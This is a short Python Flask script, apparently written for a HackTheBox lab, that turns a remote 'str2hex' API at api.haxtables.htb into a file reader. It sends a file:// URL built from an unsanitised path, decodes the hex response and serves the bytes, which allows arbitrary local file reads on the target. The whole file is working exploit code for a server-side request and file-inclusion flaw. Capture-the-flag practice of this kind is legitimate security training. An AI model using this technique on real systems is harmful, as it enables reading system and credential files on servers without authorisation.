from flask import Flask, jsonify, Response
import mimetypes 
import requests

app = Flask(__name__)

@app.route('/api/<path:filename>', methods=['GET'])
def get_file_info_or_serve_file(filename):

    json_data = {
        'action': 'str2hex',
        'file_url' : 'file:///var/www/image/' + filename,
    }

    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data).json()
    hex_data  = response["data"]
    data_bytes = bytes.fromhex(hex_data)

    mimetype, _ = mimetypes.guess_type(filename)
    if mimetype is None:
        mimetype = 'application/octet-stream'

    return Response(data_bytes, mimetype=mimetype)


if __name__ == '__main__':
    app.run(debug=True)
